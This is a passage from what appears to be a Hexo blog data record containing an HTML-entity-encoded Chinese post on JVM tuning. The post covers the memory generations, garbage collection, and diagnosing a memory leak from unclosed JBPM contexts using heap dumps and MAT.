4.程序算法调优：本次不作为重点\n","slug":"JVM性能调优","published":1,"updated":"2016-11-17T11:59:42.664Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciwbrulav000ngwtmlspjcadd","content":"<p>&#x6700;&#x8FD1;&#x56E0;&#x9879;&#x76EE;&#x5B58;&#x5728;&#x5185;&#x5B58;&#x6CC4;&#x6F0F;&#xFF0C;&#x6545;&#x8FDB;&#x884C;&#x5927;&#x89C4;&#x6A21;&#x7684;JVM&#x6027;&#x80FD;&#x8C03;&#x4F18;&#xFF0C;&#x73B0;&#x628A;&#x76F8;&#x5173;&#x77E5;&#x8BC6;&#x8FDB;&#x884C;&#x5F52;&#x7EB3;&#x603B;&#x7ED3;</p>\n<h3 id=\"&#x4E00;&#x3001;JVM&#x5185;&#x5B58;&#x6A21;&#x578B;&#x53CA;&#x5783;&#x573E;&#x6536;&#x96C6;&#x7B97;&#x6CD5;\"><a href=\"#&#x4E00;&#x3001;JVM&#x5185;&#x5B58;&#x6A21;&#x578B;&#x53CA;&#x5783;&#x573E;&#x6536;&#x96C6;&#x7B97;&#x6CD5;\" class=\"headerlink\" title=\"&#x4E00;&#x3001;JVM&#x5185;&#x5B58;&#x6A21;&#x578B;&#x53CA;&#x5783;&#x573E;&#x6536;&#x96C6;&#x7B97;&#x6CD5;\"></a>&#x4E00;&#x3001;JVM&#x5185;&#x5B58;&#x6A21;&#x578B;&#x53CA;&#x5783;&#x573E;&#x6536;&#x96C6;&#x7B97;&#x6CD5;</h3><h4 id=\"1-&#x5185;&#x5B58;&#x6A21;&#x578B;\"><a href=\"#1-&#x5185;&#x5B58;&#x6A21;&#x578B;\" class=\"headerlink\" title=\"1.&#x5185;&#x5B58;&#x6A21;&#x578B;\"></a>1.&#x5185;&#x5B58;&#x6A21;&#x578B;</h4><p>&#x6839;&#x636E;Java&#x865A;&#x62DF;&#x673A;&#x89C4;&#x8303;&#xFF0C;JVM&#x5C06;&#x5185;&#x5B58;&#x5212;&#x5206;&#x4E3A;&#xFF1A;</p>\n<ul>\n<li>&#x5E74;&#x8F7B;&#x4EE3;&#xFF08;New&#xFF09;&#xFF1A;&#x5E74;&#x8F7B;&#x4EE3;&#x7528;&#x6765;&#x5B58;&#x653E;JVM&#x521A;&#x5206;&#x914D;&#x7684;Java&#x5BF9;&#x8C61;</li>\n<li>&#x5E74;&#x8001;&#x4EE3;&#xFF08;Tenured)&#xFF1A;&#x5E74;&#x8F7B;&#x4EE3;&#x4E2D;&#x7ECF;&#x8FC7;&#x5783;&#x573E;&#x56DE;&#x6536;&#x6CA1;&#x6709;&#x56DE;&#x6536;&#x6389;&#x7684;&#x5BF9;&#x8C61;&#x5C06;&#x88AB;Copy&#x5230;&#x5E74;&#x8001;&#x4EE3;</li>\n<li>&#x6C38;&#x4E45;&#x4EE3;&#xFF08;Perm&#xFF09;&#xFF1A;&#x6C38;&#x4E45;&#x4EE3;&#x5B58;&#x653E;Class&#x3001;Method&#x5143;&#x4FE1;&#x606F;&#xFF0C;&#x5176;&#x5927;&#x5C0F;&#x8DDF;&#x9879;&#x76EE;&#x7684;&#x89C4;&#x6A21;&#x3001;&#x7C7B;&#x3001;&#x65B9;&#x6CD5;&#x7684;&#x91CF;&#x6709;&#x5173;&#xFF0C;&#x4E00;&#x822C;&#x8BBE;&#x7F6E;&#x4E3A;128M&#x5C31;&#x8DB3;&#x591F;&#xFF0C;&#x8BBE;&#x7F6E;&#x539F;&#x5219;&#x662F;&#x9884;&#x7559;30%&#x7684;&#x7A7A;&#x95F4;&#x3002;</li>\n</ul>\n<p>&#x5176;&#x4E2D;New&#x548C;Tenured&#x5C5E;&#x4E8E;&#x5806;&#x5185;&#x5B58;&#xFF0C;&#x5806;&#x5185;&#x5B58;&#x4F1A;&#x4ECE;JVM&#x542F;&#x52A8;&#x53C2;&#x6570;&#xFF08;-Xmx:3G&#xFF09;&#x6307;&#x5B9A;&#x7684;&#x5185;&#x5B58;&#x4E2D;&#x5206;&#x914D;&#x3002;<br>Perm&#x4E0D;&#x5C5E;&#x4E8E;&#x5806;&#x5185;&#x5B58;&#xFF0C;&#x6709;&#x865A;&#x62DF;&#x673A;&#x76F4;&#x63A5;&#x5206;&#x914D;&#xFF0C;&#x4F46;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;-XX:PermSize -XX:MaxPermSize &#x7B49;&#x53C2;&#x6570;&#x8C03;&#x6574;&#x5176;&#x5927;&#x5C0F;&#x3002;</p>\n<p>New&#x53C8;&#x5206;&#x4E3A;&#x51E0;&#x4E2A;&#x90E8;&#x5206;&#xFF1A;</p>\n<ul>\n<li>Eden&#xFF1A;Eden&#x7528;&#x6765;&#x5B58;&#x653E;JVM&#x521A;&#x5206;&#x914D;&#x7684;&#x5BF9;&#x8C61;</li>\n<li>Survivor1</li>\n<li>Survivro2&#xFF1A;&#x4E24;&#x4E2A;Survivor&#x7A7A;&#x95F4;&#x4E00;&#x6837;&#x5927;&#xFF0C;&#x5F53;Eden&#x4E2D;&#x7684;&#x5BF9;&#x8C61;&#x7ECF;&#x8FC7;&#x5783;&#x573E;&#x56DE;&#x6536;&#x6CA1;&#x6709;&#x88AB;&#x56DE;&#x6536;&#x6389;&#x65F6;&#xFF0C;&#x4F1A;&#x5728;&#x4E24;&#x4E2A;Survivor&#x4E4B;&#x95F4;&#x6765;&#x56DE;Copy&#xFF0C;&#x5F53;&#x6EE1;&#x8DB3;&#x67D0;&#x4E2A;&#x6761;&#x4EF6;&#xFF0C;&#x6BD4;&#x5982;Copy&#x6B21;&#x6570;&#xFF0C;&#x5C31;&#x4F1A;&#x88AB;Copy&#x5230;Tenured&#x3002;&#x663E;&#x7136;&#xFF0C;Survivor&#x53EA;&#x662F;&#x589E;&#x52A0;&#x4E86;&#x5BF9;&#x8C61;&#x5728;&#x5E74;&#x8F7B;&#x4EE3;&#x4E2D;&#x7684;&#x9017;&#x7559;&#x65F6;&#x95F4;&#xFF0C;&#x589E;&#x52A0;&#x4E86;&#x88AB;&#x5783;&#x573E;&#x56DE;&#x6536;&#x7684;&#x53EF;&#x80FD;&#x6027;&#x3002;</li>\n</ul>\n<h4 id=\"2-&#x5783;&#x573E;&#x56DE;&#x6536;&#x7B97;&#x6CD5;\"><a href=\"#2-&#x5783;&#x573E;&#x56DE;&#x6536;&#x7B97;&#x6CD5;\" class=\"headerlink\" title=\"2.&#x5783;&#x573E;&#x56DE;&#x6536;&#x7B97;&#x6CD5;\"></a>2.&#x5783;&#x573E;&#x56DE;&#x6536;&#x7B97;&#x6CD5;</h4><p>&#x5783;&#x573E;&#x56DE;&#x6536;&#x7B97;&#x6CD5;&#x53EF;&#x4EE5;&#x5206;&#x4E3A;&#x4E09;&#x7C7B;&#xFF0C;&#x90FD;&#x57FA;&#x4E8E;&#x6807;&#x8BB0;-&#x6E05;&#x9664;&#xFF08;&#x590D;&#x5236;&#xFF09;&#x7B97;&#x6CD5;&#xFF1A;</p>\n<ul>\n<li>Serial&#x7B97;&#x6CD5;&#xFF08;&#x5355;&#x7EBF;&#x7A0B;&#xFF09;</li>\n<li>&#x5E76;&#x884C;&#x7B97;&#x6CD5;</li>\n<li>&#x5E76;&#x53D1;&#x7B97;&#x6CD5;</li>\n</ul>\n<p>JVM&#x4F1A;&#x6839;&#x636E;&#x673A;&#x5668;&#x7684;&#x786C;&#x4EF6;&#x914D;&#x7F6E;&#x5BF9;&#x6BCF;&#x4E2A;&#x5185;&#x5B58;&#x4EE3;&#x9009;&#x62E9;&#x9002;&#x5408;&#x7684;&#x56DE;&#x6536;&#x7B97;&#x6CD5;&#xFF0C;&#x6BD4;&#x5982;&#xFF0C;&#x5982;&#x679C;&#x673A;&#x5668;&#x591A;&#x4E8E;1&#x4E2A;&#x6838;&#xFF0C;&#x4F1A;&#x5BF9;&#x5E74;&#x8F7B;&#x4EE3;&#x9009;&#x62E9;&#x5E76;&#x884C;&#x7B97;&#x6CD5;&#xFF0C;&#x5173;&#x4E8E;&#x9009;&#x62E9;&#x7EC6;&#x8282;&#x8BF7;&#x53C2;&#x8003;JVM&#x8C03;&#x4F18;&#x6587;&#x6863;&#x3002;</p>\n<p>&#x7A0D;&#x5FAE;&#x89E3;&#x91CA;&#x4E0B;&#x7684;&#x662F;&#xFF0C;&#x5E76;&#x884C;&#x7B97;&#x6CD5;&#x662F;&#x7528;&#x591A;&#x7EBF;&#x7A0B;&#x8FDB;&#x884C;&#x5783;&#x573E;&#x56DE;&#x6536;&#xFF0C;&#x56DE;&#x6536;&#x671F;&#x95F4;&#x4F1A;&#x6682;&#x505C;&#x7A0B;&#x5E8F;&#x7684;&#x6267;&#x884C;&#xFF0C;&#x800C;&#x5E76;&#x53D1;&#x7B97;&#x6CD5;&#xFF0C;&#x4E5F;&#x662F;&#x591A;&#x7EBF;&#x7A0B;&#x56DE;&#x6536;&#xFF0C;&#x4F46;&#x671F;&#x95F4;&#x4E0D;&#x505C;&#x6B62;&#x5E94;&#x7528;&#x6267;&#x884C;&#x3002;&#x6240;&#x4EE5;&#xFF0C;&#x5E76;&#x53D1;&#x7B97;&#x6CD5;&#x9002;&#x7528;&#x4E8E;&#x4EA4;&#x4E92;&#x6027;&#x9AD8;&#x7684;&#x4E00;&#x4E9B;&#x7A0B;&#x5E8F;&#x3002;&#x7ECF;&#x8FC7;&#x89C2;&#x5BDF;&#xFF0C;&#x5E76;&#x53D1;&#x7B97;&#x6CD5;&#x4F1A;&#x51CF;&#x5C11;&#x5E74;&#x8F7B;&#x4EE3;&#x7684;&#x5927;&#x5C0F;&#xFF0C;&#x5176;&#x5B9E;&#x5C31;&#x662F;&#x4F7F;&#x7528;&#x4E86;&#x4E00;&#x4E2A;&#x5927;&#x7684;&#x5E74;&#x8001;&#x4EE3;&#xFF0C;&#x8FD9;&#x53CD;&#x8FC7;&#x6765;&#x8DDF;&#x5E76;&#x884C;&#x7B97;&#x6CD5;&#x76F8;&#x6BD4;&#x541E;&#x5410;&#x91CF;&#x76F8;&#x5BF9;&#x8F83;&#x4F4E;&#x3002;</p>\n<p><strong>&#x8FD8;&#x6709;&#x4E00;&#x4E2A;&#x95EE;&#x9898;&#x662F;&#xFF0C;&#x5783;&#x573E;&#x56DE;&#x6536;&#x52A8;&#x4F5C;&#x4F55;&#x65F6;&#x6267;&#x884C;&#xFF1F;Full GC&#x5F71;&#x54CD;&#x8F83;&#x5927;&#xFF0C;&#x5E94;&#x5C3D;&#x53EF;&#x80FD;&#x4E0D;&#x8FDB;&#x884C;Full GC</strong></p>\n<ul>\n<li>&#x5F53;&#x5E74;&#x8F7B;&#x4EE3;&#x5185;&#x5B58;&#x6EE1;&#x65F6;&#xFF0C;&#x4F1A;&#x5F15;&#x53D1;&#x4E00;&#x6B21;&#x666E;&#x901A;GC&#xFF0C;&#x8BE5;GC&#x4EC5;&#x56DE;&#x6536;&#x5E74;&#x8F7B;&#x4EE3;&#x3002;&#x9700;&#x8981;&#x5F3A;&#x8C03;&#x7684;&#x65F6;&#xFF0C;&#x5E74;&#x8F7B;&#x4EE3;&#x6EE1;&#x662F;&#x6307;Eden&#x4EE3;&#x6EE1;&#xFF0C;Survivor&#x6EE1;&#x4E0D;&#x4F1A;&#x5F15;&#x53D1;GC</li>\n<li>&#x5F53;&#x5E74;&#x8001;&#x4EE3;&#x6EE1;&#x65F6;&#x4F1A;&#x5F15;&#x53D1;Full GC&#xFF0C;Full GC&#x5C06;&#x4F1A;&#x540C;&#x65F6;&#x56DE;&#x6536;&#x5E74;&#x8F7B;&#x4EE3;&#x3001;&#x5E74;&#x8001;&#x4EE3;</li>\n<li>&#x5F53;&#x6C38;&#x4E45;&#x4EE3;&#x6EE1;&#x65F6;&#x4E5F;&#x4F1A;&#x5F15;&#x53D1;Full GC&#xFF0C;&#x4F1A;&#x5BFC;&#x81F4;Class&#x3001;Method&#x5143;&#x4FE1;&#x606F;&#x7684;&#x5378;&#x8F7D;</li>\n</ul>\n<p><strong>&#x53E6;&#x4E00;&#x4E2A;&#x95EE;&#x9898;&#x662F;&#xFF0C;&#x4F55;&#x65F6;&#x4F1A;&#x629B;&#x51FA;OutOfMemoryException&#xFF0C;&#x5E76;&#x4E0D;&#x662F;&#x5185;&#x5B58;&#x88AB;&#x8017;&#x7A7A;&#x7684;&#x65F6;&#x5019;&#x624D;&#x629B;&#x51FA;</strong></p>\n<ul>\n<li>JVM98%&#x7684;&#x65F6;&#x95F4;&#x90FD;&#x82B1;&#x8D39;&#x5728;&#x5185;&#x5B58;&#x56DE;&#x6536;</li>\n<li>&#x6BCF;&#x6B21;&#x56DE;&#x6536;&#x7684;&#x5185;&#x5B58;&#x5C0F;&#x4E8E;2%</li>\n</ul>\n<p>&#x6EE1;&#x8DB3;&#x8FD9;&#x4E24;&#x4E2A;&#x6761;&#x4EF6;&#x5C06;&#x89E6;&#x53D1;OutOfMemoryException&#xFF0C;&#x8FD9;&#x5C06;&#x4F1A;&#x7559;&#x7ED9;&#x7CFB;&#x7EDF;&#x4E00;&#x4E2A;&#x5FAE;&#x5C0F;&#x7684;&#x95F4;&#x9699;&#x4EE5;&#x505A;&#x4E00;&#x4E9B;Down&#x4E4B;&#x524D;&#x7684;&#x64CD;&#x4F5C;&#xFF0C;&#x6BD4;&#x5982;&#x624B;&#x52A8;&#x6253;&#x5370;Heap Dump&#x3002;</p>\n<a id=\"more\"></a>      \n<p><br></p>\n<h3 id=\"&#x4E8C;&#x3001;&#x5185;&#x5B58;&#x6CC4;&#x6F0F;&#x53CA;&#x89E3;&#x51B3;&#x65B9;&#x6CD5;\"><a href=\"#&#x4E8C;&#x3001;&#x5185;&#x5B58;&#x6CC4;&#x6F0F;&#x53CA;&#x89E3;&#x51B3;&#x65B9;&#x6CD5;\" class=\"headerlink\" title=\"&#x4E8C;&#x3001;&#x5185;&#x5B58;&#x6CC4;&#x6F0F;&#x53CA;&#x89E3;&#x51B3;&#x65B9;&#x6CD5;\"></a>&#x4E8C;&#x3001;&#x5185;&#x5B58;&#x6CC4;&#x6F0F;&#x53CA;&#x89E3;&#x51B3;&#x65B9;&#x6CD5;</h3><h4 id=\"1-&#x7CFB;&#x7EDF;&#x5D29;&#x6E83;&#x524D;&#x7684;&#x4E00;&#x4E9B;&#x73B0;&#x8C61;&#xFF1A;\"><a href=\"#1-&#x7CFB;&#x7EDF;&#x5D29;&#x6E83;&#x524D;&#x7684;&#x4E00;&#x4E9B;&#x73B0;&#x8C61;&#xFF1A;\" class=\"headerlink\" title=\"1.&#x7CFB;&#x7EDF;&#x5D29;&#x6E83;&#x524D;&#x7684;&#x4E00;&#x4E9B;&#x73B0;&#x8C61;&#xFF1A;\"></a>1.&#x7CFB;&#x7EDF;&#x5D29;&#x6E83;&#x524D;&#x7684;&#x4E00;&#x4E9B;&#x73B0;&#x8C61;&#xFF1A;</h4><ul>\n<li>&#x6BCF;&#x6B21;&#x5783;&#x573E;&#x56DE;&#x6536;&#x7684;&#x65F6;&#x95F4;&#x8D8A;&#x6765;&#x8D8A;&#x957F;&#xFF0C;&#x7531;&#x4E4B;&#x524D;&#x7684;10ms&#x5EF6;&#x957F;&#x5230;50ms&#x5DE6;&#x53F3;&#xFF0C;FullGC&#x7684;&#x65F6;&#x95F4;&#x4E5F;&#x6709;&#x4E4B;&#x524D;&#x7684;0.5s&#x5EF6;&#x957F;&#x5230;4&#x3001;5s</li>\n<li>FullGC&#x7684;&#x6B21;&#x6570;&#x8D8A;&#x6765;&#x8D8A;&#x591A;&#xFF0C;&#x6700;&#x9891;&#x7E41;&#x65F6;&#x9694;&#x4E0D;&#x5230;1&#x5206;&#x949F;&#x5C31;&#x8FDB;&#x884C;&#x4E00;&#x6B21;FullGC</li>\n<li>&#x5E74;&#x8001;&#x4EE3;&#x7684;&#x5185;&#x5B58;&#x8D8A;&#x6765;&#x8D8A;&#x5927;&#x5E76;&#x4E14;&#x6BCF;&#x6B21;FullGC&#x540E;&#x5E74;&#x8001;&#x4EE3;&#x6CA1;&#x6709;&#x5185;&#x5B58;&#x88AB;&#x91CA;&#x653E;&#x4E4B;&#x540E;&#x7CFB;&#x7EDF;&#x4F1A;&#x65E0;&#x6CD5;&#x54CD;&#x5E94;&#x65B0;&#x7684;&#x8BF7;&#x6C42;&#xFF0C;&#x9010;&#x6E10;&#x5230;&#x8FBE;OutOfMemoryError&#x7684;&#x4E34;&#x754C;&#x503C;&#x3002;</li>\n</ul>\n<h4 id=\"2-&#x751F;&#x6210;&#x5806;&#x7684;dump&#x6587;&#x4EF6;\"><a href=\"#2-&#x751F;&#x6210;&#x5806;&#x7684;dump&#x6587;&#x4EF6;\" class=\"headerlink\" title=\"2.&#x751F;&#x6210;&#x5806;&#x7684;dump&#x6587;&#x4EF6;\"></a>2.&#x751F;&#x6210;&#x5806;&#x7684;dump&#x6587;&#x4EF6;</h4><p> &#x901A;&#x8FC7;JMX&#x7684;MBean&#x751F;&#x6210;&#x5F53;&#x524D;&#x7684;Heap&#x4FE1;&#x606F;&#xFF0C;&#x5927;&#x5C0F;&#x4E3A;&#x4E00;&#x4E2A;3G&#xFF08;&#x6574;&#x4E2A;&#x5806;&#x7684;&#x5927;&#x5C0F;&#xFF09;&#x7684;hprof&#x6587;&#x4EF6;&#xFF0C;&#x5982;&#x679C;&#x6CA1;&#x6709;&#x542F;&#x52A8;JMX&#x53EF;&#x4EE5;&#x901A;&#x8FC7;Java&#x7684;jmap&#x547D;&#x4EE4;&#x6765;&#x751F;&#x6210;&#x8BE5;&#x6587;&#x4EF6;&#x3002;</p>\n<h4 id=\"3-&#x5206;&#x6790;dump&#x6587;&#x4EF6;\"><a href=\"#3-&#x5206;&#x6790;dump&#x6587;&#x4EF6;\" class=\"headerlink\" title=\"3.&#x5206;&#x6790;dump&#x6587;&#x4EF6;\"></a>3.&#x5206;&#x6790;dump&#x6587;&#x4EF6;</h4><p>&#x4E0B;&#x9762;&#x8981;&#x8003;&#x8651;&#x7684;&#x662F;&#x5982;&#x4F55;&#x6253;&#x5F00;&#x8FD9;&#x4E2A;3G&#x7684;&#x5806;&#x4FE1;&#x606F;&#x6587;&#x4EF6;&#xFF0C;&#x663E;&#x7136;&#x4E00;&#x822C;&#x7684;Window&#x7CFB;&#x7EDF;&#x6CA1;&#x6709;&#x8FD9;&#x4E48;&#x5927;&#x7684;&#x5185;&#x5B58;&#xFF0C;&#x5FC5;&#x987B;&#x501F;&#x52A9;&#x9AD8;&#x914D;&#x7F6E;&#x7684;Linux&#x3002;&#x5F53;&#x7136;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x501F;&#x52A9;X-Window&#x628A;Linux&#x4E0A;&#x7684;&#x56FE;&#x5F62;&#x5BFC;&#x5165;&#x5230;Window&#x3002;&#x6211;&#x4EEC;&#x8003;&#x8651;&#x7528;&#x4E0B;&#x9762;&#x51E0;&#x79CD;&#x5DE5;&#x5177;&#x6253;&#x5F00;&#x8BE5;&#x6587;&#x4EF6;&#xFF1A;</p>\n<ul>\n<li>Visual VM</li>\n<li>IBM HeapAnalyzer</li>\n<li>JDK &#x81EA;&#x5E26;&#x7684;Hprof&#x5DE5;&#x5177;</li>\n</ul>\n<p>&#x4F7F;&#x7528;&#x8FD9;&#x4E9B;&#x5DE5;&#x5177;&#x65F6;&#x4E3A;&#x4E86;&#x786E;&#x4FDD;&#x52A0;&#x8F7D;&#x901F;&#x5EA6;&#xFF0C;&#x5EFA;&#x8BAE;&#x8BBE;&#x7F6E;&#x6700;&#x5927;&#x5185;&#x5B58;&#x4E3A;6G&#x3002;&#x4F7F;&#x7528;&#x540E;&#x53D1;&#x73B0;&#xFF0C;&#x8FD9;&#x4E9B;&#x5DE5;&#x5177;&#x90FD;&#x65E0;&#x6CD5;&#x76F4;&#x89C2;&#x5730;&#x89C2;&#x5BDF;&#x5230;&#x5185;&#x5B58;&#x6CC4;&#x6F0F;&#xFF0C;Visual VM&#x867D;&#x80FD;&#x89C2;&#x5BDF;&#x5230;&#x5BF9;&#x8C61;&#x5927;&#x5C0F;&#xFF0C;&#x4F46;&#x770B;&#x4E0D;&#x5230;&#x8C03;&#x7528;&#x5806;&#x6808;&#xFF1B;HeapAnalyzer&#x867D;&#x7136;&#x80FD;&#x770B;&#x5230;&#x8C03;&#x7528;&#x5806;&#x6808;&#xFF0C;&#x5374;&#x65E0;&#x6CD5;&#x6B63;&#x786E;&#x6253;&#x5F00;&#x4E00;&#x4E2A;3G&#x7684;&#x6587;&#x4EF6;&#x3002;&#x56E0;&#x6B64;&#xFF0C;&#x6211;&#x4EEC;&#x53C8;&#x9009;&#x7528;&#x4E86;Eclipse&#x4E13;&#x95E8;&#x7684;&#x9759;&#x6001;&#x5185;&#x5B58;&#x5206;&#x6790;&#x5DE5;&#x5177;Mat</p>\n<h4 id=\"4-&#x5206;&#x6790;&#x5185;&#x5B58;&#x6CC4;&#x6F0F;\"><a href=\"#4-&#x5206;&#x6790;&#x5185;&#x5B58;&#x6CC4;&#x6F0F;\" class=\"headerlink\" title=\"4.&#x5206;&#x6790;&#x5185;&#x5B58;&#x6CC4;&#x6F0F;\"></a>4.&#x5206;&#x6790;&#x5185;&#x5B58;&#x6CC4;&#x6F0F;</h4><p>&#x901A;&#x8FC7;Mat&#x6211;&#x4EEC;&#x80FD;&#x6E05;&#x695A;&#x5730;&#x770B;&#x5230;&#xFF0C;&#x54EA;&#x4E9B;&#x5BF9;&#x8C61;&#x88AB;&#x6000;&#x7591;&#x4E3A;&#x5185;&#x5B58;&#x6CC4;&#x6F0F;&#xFF0C;&#x54EA;&#x4E9B;&#x5BF9;&#x8C61;&#x5360;&#x7684;&#x7A7A;&#x95F4;&#x6700;&#x5927;&#x53CA;&#x5BF9;&#x8C61;&#x7684;&#x8C03;&#x7528;&#x5173;&#x7CFB;&#x3002;&#x9488;&#x5BF9;&#x672C;&#x6848;&#xFF0C;&#x5728;ThreadLocal&#x4E2D;&#x6709;&#x5F88;&#x591A;&#x7684;JbpmContext&#x5B9E;&#x4F8B;&#xFF0C;&#x7ECF;&#x8FC7;&#x8C03;&#x67E5;&#x662F;JBPM&#x7684;Context&#x6CA1;&#x6709;&#x5173;&#x95ED;&#x6240;&#x81F4;</p>\n<p>&#x53E6;&#x5916;&#xFF0C;&#x901A;&#x8FC7;Mat&#x6216;JMX&#x6211;&#x4EEC;&#x8FD8;&#x53EF;&#x4EE5;&#x5206;&#x6790;&#x7EBF;&#x7A0B;&#x72B6;&#x6001;&#xFF0C;&#x53EF;&#x4EE5;&#x89C2;&#x5BDF;&#x5230;&#x7EBF;&#x7A0B;&#x88AB;&#x963B;&#x585E;&#x5728;&#x54EA;&#x4E2A;&#x5BF9;&#x8C61;&#x4E0A;&#xFF0C;&#x4ECE;&#x800C;&#x5224;&#x65AD;&#x7CFB;&#x7EDF;&#x7684;&#x74F6;&#x9888;&#x3002;</p>\n<h4 id=\"5-&#x56DE;&#x5F52;&#x95EE;&#x9898;\"><a href=\"#5-&#x56DE;&#x5F52;&#x95EE;&#x9898;\" class=\"headerlink\" title=\"5.&#x56DE;&#x5F52;&#x95EE;&#x9898;\"></a>5.&#x56DE;&#x5F52;&#x95EE;&#x9898;</h4><p><strong> Q&#xFF1A;&#x4E3A;&#x4EC0;&#x4E48;&#x5D29;&#x6E83;&#x524D;&#x5783;&#x573E;&#x56DE;&#x6536;&#x7684;&#x65F6;&#x95F4;&#x8D8A;&#x6765;&#x8D8A;&#x957F;&#xFF1F;</strong><br>A:&#x6839;&#x636E;&#x5185;&#x5B58;&#x6A21;&#x578B;&#x548C;&#x5783;&#x573E;&#x56DE;&#x6536;&#x7B97;&#x6CD5;&#xFF0C;&#x5783;&#x573E;&#x56DE;&#x6536;&#x5206;&#x4E24;&#x90E8;&#x5206;&#xFF1A;&#x5185;&#x5B58;&#x6807;&#x8BB0;&#x3001;&#x6E05;&#x9664;&#xFF08;&#x590D;&#x5236;&#xFF09;&#xFF0C;&#x6807;&#x8BB0;&#x90E8;&#x5206;&#x53EA;&#x8981;&#x5185;&#x5B58;&#x5927;&#x5C0F;&#x56FA;&#x5B9A;&#x65F6;&#x95F4;&#x662F;&#x4E0D;&#x53D8;&#x7684;&#xFF0C;&#x53D8;&#x7684;&#x662F;&#x590D;&#x5236;&#x90E8;&#x5206;&#xFF0C;&#x56E0;&#x4E3A;&#x6BCF;&#x6B21;&#x5783;&#x573E;&#x56DE;&#x6536;&#x90FD;&#x6709;&#x4E00;&#x4E9B;&#x56DE;&#x6536;&#x4E0D;&#x6389;&#x7684;&#x5185;&#x5B58;&#xFF0C;&#x6240;&#x4EE5;&#x589E;&#x52A0;&#x4E86;&#x590D;&#x5236;&#x91CF;&#xFF0C;&#x5BFC;&#x81F4;&#x65F6;&#x95F4;&#x5EF6;&#x957F;&#x3002;&#x6240;&#x4EE5;&#xFF0C;&#x5783;&#x573E;&#x56DE;&#x6536;&#x7684;&#x65F6;&#x95F4;&#x4E5F;&#x53EF;&#x4EE5;&#x4F5C;&#x4E3A;&#x5224;&#x65AD;&#x5185;&#x5B58;&#x6CC4;&#x6F0F;&#x7684;&#x4F9D;&#x636E;<br><strong>Q&#xFF1A;&#x4E3A;&#x4EC0;&#x4E48;Full GC&#x7684;&#x6B21;&#x6570;&#x8D8A;&#x6765;&#x8D8A;&#x591A;&#xFF1F;</strong><br>A&#xFF1A;&#x56E0;&#x6B64;&#x5185;&#x5B58;&#x7684;&#x79EF;&#x7D2F;&#xFF0C;&#x9010;&#x6E10;&#x8017;&#x5C3D;&#x4E86;&#x5E74;&#x8001;&#x4EE3;&#x7684;&#x5185;&#x5B58;&#xFF0C;&#x5BFC;&#x81F4;&#x65B0;&#x5BF9;&#x8C61;&#x5206;&#x914D;&#x6CA1;&#x6709;&#x66F4;&#x591A;&#x7684;&#x7A7A;&#x95F4;&#xFF0C;&#x4ECE;&#x800C;&#x5BFC;&#x81F4;&#x9891;&#x7E41;&#x7684;&#x5783;&#x573E;&#x56DE;&#x6536;<br><strong>Q:&#x4E3A;&#x4EC0;&#x4E48;&#x5E74;&#x8001;&#x4EE3;&#x5360;&#x7528;&#x7684;&#x5185;&#x5B58;&#x8D8A;&#x6765;&#x8D8A;&#x5927;&#xFF1F;</strong><br>A:&#x56E0;&#x4E3A;&#x5E74;&#x8F7B;&#x4EE3;&#x7684;&#x5185;&#x5B58;&#x65E0;&#x6CD5;&#x88AB;&#x56DE;&#x6536;&#xFF0C;&#x8D8A;&#x6765;&#x8D8A;&#x591A;&#x5730;&#x88AB;Copy&#x5230;&#x5E74;&#x8001;&#x4EE3;</p>\n<p><br></p>\n<h3 id=\"&#x4E09;&#x3001;&#x6027;&#x80FD;&#x8C03;&#x4F18;\"><a href=\"#&#x4E09;&#x3001;&#x6027;&#x80FD;&#x8C03;&#x4F18;\" class=\"headerlink\" title=\"&#x4E09;&#x3001;&#x6027;&#x80FD;&#x8C03;&#x4F18;\"></a>&#x4E09;&#x3001;&#x6027;&#x80FD;&#x8C03;&#x4F18;</h3><p>&#x9664;&#x4E86;&#x4E0A;&#x8FF0;&#x5185;&#x5B58;&#x6CC4;&#x6F0F;&#x5916;&#xFF0C;&#x6211;&#x4EEC;&#x8FD8;&#x53D1;&#x73B0;CPU&#x957F;&#x671F;&#x4E0D;&#x8DB3;3%&#xFF0C;&#x7CFB;&#x7EDF;&#x541E;&#x5410;&#x91CF;&#x4E0D;&#x591F;&#xFF0C;&#x9488;&#x5BF9;8core&#xD7;16G&#x3001;64bit&#x7684;Linux&#x670D;&#x52A1;&#x5668;&#x6765;&#x8BF4;&#xFF0C;&#x662F;&#x4E25;&#x91CD;&#x7684;&#x8D44;&#x6E90;&#x6D6A;&#x8D39;&#x3002;&#x5728;CPU&#x8D1F;&#x8F7D;&#x4E0D;&#x8DB3;&#x7684;&#x540C;&#x65F6;&#xFF0C;&#x5076;&#x5C14;&#x4F1A;&#x6709;&#x7528;&#x6237;&#x53CD;&#x6620;&#x8BF7;&#x6C42;&#x7684;&#x65F6;&#x95F4;&#x8FC7;&#x957F;&#xFF0C;&#x6211;&#x4EEC;&#x610F;&#x8BC6;&#x5230;&#x5FC5;&#x987B;&#x5BF9;&#x7A0B;&#x5E8F;&#x53CA;JVM&#x8FDB;&#x884C;&#x8C03;&#x4F18;&#x3002;&#x4ECE;&#x4EE5;&#x4E0B;&#x51E0;&#x4E2A;&#x65B9;&#x9762;&#x8FDB;&#x884C;&#xFF1A;</p>\n<ul>\n<li>&#x7EBF;&#x7A0B;&#x6C60;&#xFF1A;&#x89E3;&#x51B3;&#x7528;&#x6237;&#x54CD;&#x5E94;&#x65F6;&#x95F4;&#x957F;&#x7684;&#x95EE;&#x9898;</li>\n<li>&#x8FDE;&#x63A5;&#x6C60;</li>\n<li>JVM&#x542F;&#x52A8;&#x53C2;&#x6570;&#xFF1A;&#x8C03;&#x6574;&#x5404;&#x4EE3;&#x7684;&#x5185;&#x5B58;&#x6BD4;&#x4F8B;&#x548C;&#x5783;&#x573E;&#x56DE;&#x6536;&#x7B97;&#x6CD5;&#xFF0C;&#x63D0;&#x9AD8;&#x541E;&#x5410;&#x91CF;</li>\n<li>&#x7A0B;&#x5E8F;&#x7B97;&#x6CD5;&#xFF1A;&#x6539;&#x8FDB;&#x7A0B;&#x5E8F;&#x903B;&#x8F91;&#x7B97;&#x6CD5;&#x63D0;&#x9AD8;&#x6027;&#x80FD;&#x3001;</li>\n</ul>\n<h4 id=\"1-Java&#x7EBF;&#x7A0B;&#x6C60;&#xFF08;java-util-concurrent-ThreadPoolExecutor&#xFF09;\"><a href=\"#1-Java&#x7EBF;&#x7A0B;&#x6C60;&#xFF08;java-util-concurrent-ThreadPoolExecutor&#xFF09;\" class=\"headerlink\" 